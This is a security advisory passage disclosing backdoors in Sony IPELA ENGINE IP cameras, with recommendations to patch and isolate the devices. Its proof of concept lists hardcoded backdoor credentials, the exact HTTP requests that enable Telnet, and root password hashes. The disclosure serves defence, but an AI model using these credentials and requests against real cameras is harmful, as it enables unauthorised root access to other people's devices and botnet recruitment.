Business recommendation:
------------------------
Attackers are able to completely takeover the Sony IPELA ENGINE IP Camera
products over the network.

Sony has provided updated firmware which should be installed immediately.

SEC Consult recommends Sony and Sony customers to conduct a thorough
security review of the affected products.

It is essential to restrict access to IP cameras using VLANs, firewalls
etc. Otherwise the risk of being a botnet victim (e.g. Mirai) is high.


Vulnerability overview/description:
-----------------------------------
Sony IPELA ENGINE IP Cameras contain multiple backdoors that, among other
functionality, allow an attacker to enable the Telnet/SSH service for
remote administration over the network.

Other available functionality may have undesired effects to the camera
image quality or other camera functionality.

After enabling Telnet/SSH, another backdoor allows an attacker to gain
access to a Linux shell with root privileges!

The vulnerabilities are exploitable in the default configuration over the
network. Exploitation over the Internet is possible, if the web interface
of the device is exposed.


Proof of concept:
-----------------
The following application-level backdoor accounts exist:
- User debug, Passwort: popeyeConnection
- User primana, Passwort: primana

These accounts are allowed to access specific, undocumented CGI functionality!

Enabling Telnet:
Execute the following HTTP requests. Afterwards the Telnet service is running
(TCP port 23). The following command is for Gen5 products, verified on SNC-DH160:

   http://primana:primana@HOST/command/prima-factory.cgi?foo=bar&Telnet=zKw2hEr9
   http://primana:primana@HOST/command/prima-factory.cgi?foo=bar&Telnet=cPoq2fi4cFk

Note: This request may look a bit different for Gen6 cameras, the string
"himitunokagi" (Japanese, translated: "secret key") is involved in the HTTP
request processing. On Gen6 cameras, a SSH daemon exists and can be enabled as
well.

Furthermore an OS-level backdoor exists. This backdoor allows an attacker to
login via Telnet/SSH and access the Linux shell with root privileges!

Below are the password hashes for the OS-level backdoor user:

   root:$1$$mhF8LHkOmSgbD88/WrM790:0:0:5thgen:/root:/bin/sh (Gen5 cameras)
   root:iMaxAEXStYyd6:0:0:root:/root:/bin/sh (Gen6 cameras)

Note: The backdoor accounts likely allow an attacker with physical access to
the hardware to login via the serial port as well.


Vulnerable / tested versions:
-----------------------------
This vulnerability was verified on a SNC-DH160 camera with firmware
version V1.82.01 (snc-ch-dh-e-series-eb-em-zb-zm-1-82-01.zip).

The same vulnerabilities were found in firmware for Gen6 cameras
V2.7.0 (snc-g6-series-v2-7-0.zip) during automated firmware analysis with
SEC Technologies IoT Inspector.
